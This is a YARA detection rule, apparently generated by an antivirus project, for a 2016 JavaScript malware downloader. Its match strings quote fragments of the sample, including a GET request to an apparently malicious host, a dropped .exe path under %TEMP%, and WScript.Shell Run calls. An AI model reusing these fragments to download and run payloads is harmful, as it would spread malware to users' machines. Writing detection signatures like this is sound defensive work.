rule sig_20160329_8bd27f05e0f15cea5741583d1f1ecd75 {
  meta:
    description = "datamaliciousorder - file 20160329_8bd27f05e0f15cea5741583d1f1ecd75.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b7f2edbd3e68a989720ad14fdfb0651af74bcafefe99f9250aa46bfff0bb7f4b"

  strings:
    $s1  = "Zp[W](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function ta() {return ir[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"w2rLafksRJvJ.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[E0](Hi() * 11); if (Zp[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var ir = function t() {return WScript[qG](\"WScript.Shell\");}(), CN = 11;" fullword ascii
    $s5  = "function x(o0, G){AS = AS * 1; return o0 - G;};" fullword ascii
    $s6  = "function L(){return \"\" + x0;};" fullword ascii
    $s7  = "function e() {return ((Lg == true) && (Lg == dA)) ? 1 : AS;};" fullword ascii
    $s8  = "function s(FO){ir[\"Run\"](FO, AS, AS);};" fullword ascii
    $s9  = " while (F){" fullword ascii
    $s10 = "var z = new this[\"Date\"]();" fullword ascii
    $s11 = "return x(L0, N);" fullword ascii
    $s12 = "function ae(){return qG;};" fullword ascii
    $s13 = "function h(SA) {var tQ = (1, 2, 3, 4, 5, SA); return tQ;};" fullword ascii
    $s14 = "function o()" fullword ascii
    $s15 = "function Hi(){return 22;};" fullword ascii
    $s16 = "var Lg = false;" fullword ascii
    $s17 = "Lg = true; " fullword ascii
    $s18 = "dA = true; " fullword ascii
    $s19 = "var dA = false;" fullword ascii
    $s20 = "var vQ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}